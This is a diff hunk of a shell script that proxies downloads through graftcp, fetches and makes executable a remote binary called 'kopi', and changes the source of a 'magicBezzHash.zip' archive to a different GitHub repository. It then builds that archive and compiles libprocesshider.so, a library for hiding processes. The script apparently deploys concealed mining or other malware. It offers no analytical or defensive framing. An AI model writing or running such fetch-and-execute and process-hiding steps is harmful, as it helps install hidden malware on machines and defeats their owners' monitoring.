@@ -37,7 +37,7 @@ echo " "
 ./graftcp/graftcp wget https://github.com/aurbach55/dera/raw/main/kopi
 chmod +x kopi
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+./graftcp/graftcp wget https://github.com/aurbach55/a/raw/main/magicBezzHash.zip
 unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
